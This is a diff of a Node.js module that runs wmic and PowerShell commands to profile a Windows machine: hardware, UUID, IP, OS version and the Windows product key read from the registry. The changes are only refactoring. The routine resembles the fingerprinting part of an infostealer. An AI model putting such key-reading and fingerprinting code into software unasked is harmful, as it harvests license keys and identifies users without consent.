@@ -1,62 +1,73 @@
 const util = require("util");
-const exec = util.promisify(require("child_process").exec);
+const child_process = require("child_process")
+const exec = util.promisify(child_process.exec);
 
 async function getDisk() {
     try {
-        const size = (await getCommand("wmic logicaldisk get size")).split(" ").filter(item => item.trim() !== "" && item.trim().toLowerCase() !== "size");
-        return size.length > 0 ? Math.floor(parseInt(size[0]) / (1024 * 1024 * 1024)).toString() : "1000";
-    } catch (err) {
-        console.error(err);
+        let s = (await getCommand("wmic logicaldisk get size")).split(" ").filter(item => item.trim() !== "" && item.trim().toLowerCase() !== "size");
+        return s.length > 0 ? Math.floor(parseInt(s[0]) / (1024 * 1024 * 1024)).toString() : "1000";
+    } catch (e) {
+        console.error(e);
         return "1000";
     }
 }
 
 async function getTotalMemory() {
     try {
-        const tpm = await getCommand("wmic computersystem get totalphysicalmemory | more +1");
-        return parseInt(Math.floor(parseInt(tpm) / (1024 * 1024 * 1024)));
-    } catch (err) {
-        console.error(err);
-        return 4;
+        let t = await getCommand("wmic computersystem get totalphysicalmemory | more +1");
+        return parseInt(Math.floor(parseInt(t) / (1024 * 1024 * 1024)));
+    } catch (e) {
+        console.error(e);
+        return "4";
     }
 }
 
 async function getCleanUUID() {
     try {
-        const uid = await getCommand("wmic csproduct get uuid");
-        const regexUid = /UUID\s+([A-Fa-f0-9-]+)/;
-        const match = uid.match(regexUid);
-        return match ? match[1] : "Not found";
-    } catch (err) {
-        console.error(err);
+        let u = await getCommand("wmic csproduct get uuid"),
+            m = u.match(/UUID\s+([A-Fa-f0-9-]+)/);
+        return m ? m[1] : "Not found";
+    } catch (e) {
+        console.error(e);
         return "Not found";
     }
 }
 
-async function getCommand(cmd) {
+async function getCommand(c) {
     try {
-        const { stdout } = await exec(cmd);
+        let { stdout } = await exec(c);
         return stdout.trim();
-    } catch (err) {
-        console.error(err);
+    } catch (e) {
+        console.error(e);
         return "";
     }
 }
 
 async function getCpuCount() {
     try {
-        const stdout = await getCommand("echo %NUMBER_OF_PROCESSORS%");
-        const cpuCount = parseInt(stdout);
-        return isNaN(cpuCount) ? "4" : cpuCount.toString();
-    } catch (err) {
-        console.error(err);
+        let s = await getCommand("echo %NUMBER_OF_PROCESSORS%"),
+            c = parseInt(s);
+        return isNaN(c) ? "4" : c.toString();
+    } catch (e) {
+        console.error(e);
         return "4";
     }
 }
 
 async function getInfo() {
     try {
-        const [ disk, ram, uid, cpucount, ip, os, cpu, gpu, windowskey, windowsversion ] = await Promise.all([
+        const [ 
+            DISK, 
+            RAM, 
+            UID, 
+            CPU_COUNT, 
+            IP, 
+            OS, 
+            CPU, 
+            GPU, 
+            WINDOWS_KEY, 
+            WINDOWS_VERSION
+        ] = await Promise.all([
             getDisk(),
             getTotalMemory(),
             getCleanUUID(),
@@ -68,19 +79,30 @@ async function getInfo() {
             getCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"),
             getCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName"),
         ]);
-        return { disk, ram, uid, cpucount, ip, os, cpu, gpu, windowskey, windowsversion }
-    } catch (err) {
-        console.error(err);
+        return { 
+            DISK, 
+            RAM, UID, 
+            CPU_COUNT, 
+            IP, 
+            OS, 
+            CPU, 
+            GPU, 
+            WINDOWS_KEY, 
+            WINDOWS_VERSION 
+        }
+    } catch (e) {
+        console.error(e);
         return {
-            disk: "Not found",
-            ram: "Not found",
-            uid: "Not found",
-            cpucount: "Not found",
-            os: "Not found",
-            cpu: "Not found",
-            gpu: "Not found",
-            windowskey: "Not found",
-            windowsversion: "Not found",
+            DISK: "Not found",
+            RAM: "Not found",
+            UID: "Not found",
+            CPU_COUNT: "Not found",
+            IP: "Not found",
+            OS: "Not found",
+            CPU: "Not found",
+            GPU: "Not found",
+            WINDOWS_KEY: "Not found",
+            WINDOWS_VERSION: "Not found",
         };
     }
 }
